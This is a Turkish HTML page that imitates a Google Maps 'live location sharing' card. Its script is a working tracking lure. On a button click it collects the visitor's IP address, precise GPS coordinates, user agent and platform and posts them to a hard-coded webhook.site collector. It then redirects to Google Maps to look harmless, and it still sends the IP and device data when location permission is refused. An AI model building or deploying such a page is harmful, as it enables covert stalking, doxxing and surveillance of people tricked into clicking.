<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konum Takip</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .kart {
            background: white;
            border-radius: 25px;
            padding: 30px 25px;
            text-align: center;
            max-width: 350px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            transition: transform 0.3s;
        }
        .kart:active {
            transform: scale(0.98);
        }
        .map-image {
            width: 100%;
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        h2 {
            font-size: 18px;
            color: #5f6368;
            font-weight: 500;
            margin-bottom: 20px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 16px 25px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        button:active {
            transform: scale(0.97);
            background: #0d5bba;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .small-text {
            font-size: 11px;
            color: #9aa0a6;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="kart">
        <!-- Google Maps Görseli -->
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Google Maps" class="map-image">
        <h2>📍 Canlı Konum Paylaşımı</h2>
        <button id="konumBtn">Konumu Göster</button>
        <div class="small-text">Konum bilginiz paylaşılacak</div>
    </div>

    <script>
        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
        
        async function konumGonder() {
            const btn = document.getElementById('konumBtn');
            btn.innerText = "⏳ Konum alınıyor...";
            btn.disabled = true;
            
            let ip = "Bilinmiyor";
            let konumLink = "İzin verilmedi";
            let enlem = null;
            let boylam = null;
            
            // 1. IP al
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                ip = json.ip;
            } catch(e) {}
            
            // 2. Konum al
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        enlem = position.coords.latitude;
                        boylam = position.coords.longitude;
                        konumLink = `https://www.google.com/maps?q=${enlem},${boylam}`;
                        
                        // Webhook'a gönder
                        const veri = {
                            tip: "Konum_Takip",
                            zaman: new Date().toLocaleString('tr-TR'),
                            ip: ip,
                            enlem: enlem,
                            boylam: boylam,
                            konum_link: konumLink,
                            cihaz: navigator.userAgent,
                            platform: navigator.platform
                        };
                        
                        try {
                            await fetch(webhookURL, {
                                method: 'POST',
                                mode: 'no-cors',
                                body: JSON.stringify(veri)
                            });
                        } catch(e) {}
                        
                        btn.innerText = "✅ Konum gönderildi";
                        
                        // Google Maps'e yönlendir
                        setTimeout(() => {
                            window.location.href = konumLink;
                        }, 800);
                    },
                    async (hata) => {
                        // Konum izni verilmedi
                        const veri = {
                            tip: "Konum_Takip",
                            zaman: new Date().toLocaleString('tr-TR'),
                            ip: ip,
                            konum_link: "İzin verilmedi",
                            hata: hata.message,
                            cihaz: navigator.userAgent
                        };
                        
                        try {
                            await fetch(webhookURL, {
                                method: 'POST',
                                mode: 'no-cors',
                                body: JSON.stringify(veri)
                            });
                        } catch(e) {}
                        
                        btn.innerText = "📍 Konum Göster";
                        btn.disabled = false;
                        alert("Konum izni vermeniz gerekiyor!");
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                alert("Tarayıcınız konum desteklemiyor");
                btn.innerText = "📍 Konum Göster";
                btn.disabled = false;
            }
        }
        
        // Butona tıkla
        document.getElementById('konumBtn').onclick = konumGonder;
    </script>
</body>
</html>
